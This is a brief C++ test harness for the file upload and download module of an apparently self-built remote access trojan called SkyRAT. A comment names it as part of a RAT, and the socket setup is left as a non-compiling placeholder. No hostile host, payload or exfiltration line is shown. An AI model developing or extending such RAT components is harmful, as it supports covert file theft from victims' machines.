#include "DataTransferModule.h"
#include <iostream>
#include <iomanip>

// Example: Callback for progress
void onProgress(int percent, long long transferred, long long total) {
    if (total > 0)
        std::cout << "\rProgress: " << percent << "%  (" << transferred/1024 << "KB/" << total/1024 << "KB)" << std::flush;
}

int main() {
    std::cout << "== DATA TRANSFER MODULE TEST ==" << std::endl;

    // Replace with actual socket creation and connection as required
    SOCKET socket = /* connect to your server here */;
    
    SkyRAT::Modules::Implementations::DataTransferModule transfer;
    transfer.setProgressCallback(onProgress);

    // Example test: upload
    if (transfer.isRunning()) {
        transfer.uploadFile("local.txt", "remote.txt");
        transfer.downloadFile("remote.txt", "downloaded.txt");
    }
    // Normally, you'd start/stop with server socket and handle commands, as part of a RAT.

    std::cout << std::endl << "Done!" << std::endl;
    return 0;
}
